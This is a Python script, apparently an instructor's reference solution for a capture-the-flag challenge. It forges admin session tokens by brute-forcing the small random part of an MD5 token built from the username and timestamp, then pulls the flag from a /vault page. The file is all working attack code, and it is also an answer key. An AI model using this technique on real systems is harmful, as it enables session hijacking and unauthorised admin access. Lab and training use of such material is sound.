#!/usr/bin/env python3
"""
INSTRUCTOR REFERENCE - Challenge 4 Solver
This demonstrates the expected student solution for the entropy brute force.

Students should arrive at something similar to this after:
1. Analyzing their own token generation
2. Finding the admin login timestamp in audit logs
3. Recognizing the small random component can be brute-forced
"""

import hashlib
import requests
import sys

# Target URL - adjust as needed
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

# From the audit logs, admin logged in at this timestamp
ADMIN_TIMESTAMP = 1737450000

def generate_token(username, timestamp, random_component):
    """Replicate the server's token generation algorithm"""
    token_input = f"{username}{timestamp}{random_component}"
    return hashlib.md5(token_input.encode()).hexdigest()


def try_token(token):
    """Test if a token grants admin access to the vault"""
    cookies = {"session": token}
    try:
        resp = requests.get(f"{TARGET_URL}/vault", cookies=cookies, allow_redirects=False)
        # If we get 200 and see "Master Encryption Key", we have admin
        if resp.status_code == 200 and "Master Encryption Key" in resp.text:
            return True, resp.text
        return False, None
    except requests.RequestException as e:
        print(f"Request error: {e}")
        return False, None


def main():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Admin login timestamp from logs: {ADMIN_TIMESTAMP}")
    print(f"[*] Brute forcing random component (0-999)...")
    print()
    
    for rand in range(1000):
        token = generate_token("admin", ADMIN_TIMESTAMP, rand)
        
        if rand % 100 == 0:
            print(f"[*] Trying random={rand}, token={token[:16]}...")
        
        success, response = try_token(token)
        
        if success:
            print()
            print(f"[+] SUCCESS! Found valid admin token!")
            print(f"[+] Random component: {rand}")
            print(f"[+] Token: {token}")
            print()
            
            # Extract flag from response
            if "flag{" in response:
                start = response.find("flag{")
                end = response.find("}", start) + 1
                flag = response[start:end]
                print(f"[+] FLAG: {flag}")
            
            return
    
    print("[-] Failed to find valid token in range 0-999")
    print("[-] Possible issues:")
    print("    - Wrong timestamp?")
    print("    - Random range might be larger?")
    print("    - Algorithm might be different?")


if __name__ == "__main__":
    main()
